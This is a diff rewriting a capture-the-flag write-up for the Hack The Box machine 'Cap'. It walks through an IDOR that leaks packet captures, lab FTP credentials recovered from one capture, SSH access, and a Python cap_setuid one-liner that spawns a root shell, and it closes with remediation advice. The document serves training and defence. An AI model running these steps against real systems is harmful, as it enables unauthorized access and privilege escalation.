@@ -1,191 +1,116 @@
-# Hack The Box — Cap
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-IDOR%20%7C%20PCAP%20Analysis%20%7C%20Privilege%20Escalation-red)
+Cap is an Easy Linux machine hosting a network security dashboard. An **IDOR**
+in the capture download feature exposes other users' PCAP files, one of which
+contains plaintext FTP credentials. Those credentials grant SSH access, and a
+`cap_setuid` capability set on the Python binary is abused to escalate to
+**root**.
 
----
+## Machine Information
 
-# Machine Information
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Cap | Easy | Linux | Hack The Box |
 
-| Name | Difficulty | Platform | OS |
-|-----|-----|-----|-----|
-| Cap | Easy | Hack The Box | Linux |
+## Attack Path
 
----
+1. Nmap reveals FTP, SSH and HTTP services.
+2. A web dashboard allows downloading PCAP captures.
+3. An IDOR exposes other users' capture files.
+4. PCAP analysis reveals plaintext FTP credentials.
+5. SSH access is obtained as the user `nathan`.
+6. Enumeration finds the Python binary with the `cap_setuid` capability.
+7. The capability is abused to escalate to root.
 
-# Attack Path
+## Reconnaissance
 
-1. Nmap scan reveals FTP, SSH and HTTP services
+Initial service enumeration was performed with **Nmap**.
 
-2. Web dashboard allows downloading PCAP captures
-
-3. IDOR vulnerability exposes other capture files
-
-4. PCAP analysis reveals FTP credentials
-
-5. SSH access obtained as user nathan
-
-6. linPEAS reveals Python binary with cap_setuid capability
-
-7. Python used to escalate privileges to root
-
-
----
-
-# Reconnaissance
-
-The first step was performing a service enumeration using **Nmap**.
-
-```sudo nmap -sV -sC -T5 -A 10.129.10.156```
-
-
-![Nmap Scan](screenshots/nmap.png)
-
-The scan revealed the following services:
+```bash
+sudo nmap -sV -sC -A 10.129.10.156
+```
 
 | Port | Service | Version |
-|----|----|----|
-|21|FTP|vsftpd 3.0.3|
-|22|SSH|OpenSSH 8.2p1|
-|80|HTTP|Gunicorn Web Server|
+| --- | --- | --- |
+| 21 | FTP | vsftpd 3.0.3 |
+| 22 | SSH | OpenSSH 8.2p1 |
+| 80 | HTTP | Gunicorn |
 
 The HTTP service hosted a **Security Dashboard** web application.
 
----
+## Web Enumeration
 
-# Web Enumeration
+The dashboard displayed network traffic statistics and allowed users to
+download **PCAP files** of captured traffic. The download URL used a sequential
+numeric parameter:
 
-Accessing the web server revealed a dashboard that displays **network traffic statistics**.
+```
+http://10.129.10.156/data/5
+```
 
-![Dashboard](screenshots/dashboard.png)
+Changing the ID to another value exposed other users' captures
+(`/data/0`), confirming an **Insecure Direct Object Reference (IDOR)**.
 
-The application allowed users to download **PCAP files** containing captured traffic.
+## PCAP Analysis
 
-The URL contained a numeric parameter: /data/<id>
+The capture at `/data/0` was downloaded and opened in **Wireshark**. The FTP
+traffic inside contained plaintext credentials.
 
-Example: http://10.129.10.156/data/5
+```
+nathan : Buck3tH4TF0RM3!
+```
 
-By modifying the ID to another value, it was possible to access **other captures**.
+## Initial Access (User)
 
-Example: http://10.129.10.156/data/0
+The recovered credentials were reused to authenticate over SSH as `nathan`.
 
+```bash
+ssh nathan@10.129.10.156
+```
 
-This behavior indicates an **Insecure Direct Object Reference (IDOR)** vulnerability.
+This provided the initial foothold on the system. The user flag lives at
+`/home/nathan/user.txt`.
 
----
+## Privilege Escalation
 
-# PCAP Analysis
+### Enumeration
 
-After downloading the PCAP file, it was opened in **Wireshark**.
+`linPEAS` was run to look for escalation vectors and flagged an interesting
+capability on the Python binary.
 
-Inside the capture, FTP traffic revealed plaintext credentials.
+```bash
+scp linpeas.sh nathan@10.129.10.156:/tmp/
+```
 
-![FTP Credentials](screenshots/wireshark-creds.png)
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
 
-Credentials discovered:
+### Abusing cap_setuid
 
-USER: nathan
-PASS: Buck3tH4TF0RM3!
+The `cap_setuid` capability allows the process to change its effective UID, so
+Python can be used to set UID 0 and spawn a root shell.
 
+```bash
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
 
----
+This successfully spawned a shell as root. The root flag lives at
+`/root/root.txt`.
 
-# Initial Access
+## Vulnerability Analysis
 
-Using the discovered credentials, SSH access was obtained.
+**Insecure Direct Object Reference (IDOR)** — the dashboard served PCAP captures
+by a sequential numeric ID (`/data/5`), and changing the ID (`/data/0`) returned
+other users' captures, disclosing plaintext credentials. Fix: enforce per-object
+authorization checks server-side and use non-sequential, unguessable identifiers.
 
-```ssh nathan@10.129.10.156```
+**Insecure Linux capability (`cap_setuid`)** — the Python binary carried
+`cap_setuid`, letting any user running it set UID 0 and spawn a root shell. Fix:
+remove unnecessary file capabilities and never grant `cap_setuid` to a
+general-purpose interpreter.
 
-After logging in, the **user flag** was retrieved.
-
-```cat user.txt```
-
-![User Flag](screenshots/user-flag.png)
-
-```16454a.....................```
-
-
----
-
-# Privilege Escalation
-
-To identify possible privilege escalation vectors, **linPEAS** was executed.
-
-```scp linpeas.sh nathan@10.129.10.156:/tmp/```
-
-
-linPEAS revealed an interesting capability on the Python binary.
-
-![Python Capabilities](screenshots/05-python-capabilities.png)
-
-```/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip```
-
-
-The **cap_setuid capability** allows the process to change its effective UID.
-
-This can be abused to spawn a root shell.
-
----
-
-# Exploiting the Capability
-
-Using Python, the UID can be changed to **0 (root)**.
-
-```/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
-
-
-This successfully spawned a root shell.
-
----
-
-# Root Access
-
-After gaining root privileges, the root flag was retrieved.
-
-```cd /root```
-```cat root.txt```
-
-
-![Root Flag](screenshots/root-flag.png)
-
-```170f05.....................```
-
----
-
-# Flags
-
-### User Flag
-
-16454a.....................
-
-### Root Flag
-
-170f05.....................
-
-
----
-
-# Vulnerabilities Identified
-
-### Insecure Direct Object Reference (IDOR)
-
-The web application allowed users to access PCAP captures using a sequential ID.
-
-Example: ```/data/5```
-
-By modifying the ID it was possible to access other captures: ```/data/0```
-
-
-Impact:
-
-- Unauthorized access to internal packet captures
-- Credential disclosure
-
----
-
-# Tools Used
+## Tools Used
 
 - Nmap
 - Wireshark
@@ -193,19 +118,9 @@ Impact:
 - linPEAS
 - Python
 
----
+## Key Takeaways
 
-# Key Takeaways
-
-This machine demonstrates important security concepts:
-
-- IDOR vulnerabilities can expose sensitive internal data
-- Packet captures may contain plaintext credentials
-- Linux capabilities can create dangerous privilege escalation vectors
-- Proper privilege and file permission management is critical
-
----
-
-# Author
-
-GitHub: https://github.com/ninjaa-exe
+- IDOR vulnerabilities can expose sensitive internal data such as packet captures.
+- Packet captures frequently contain plaintext credentials.
+- Linux capabilities like `cap_setuid` are a dangerous and often overlooked privesc vector.
+- Proper privilege and file-permission management is critical.
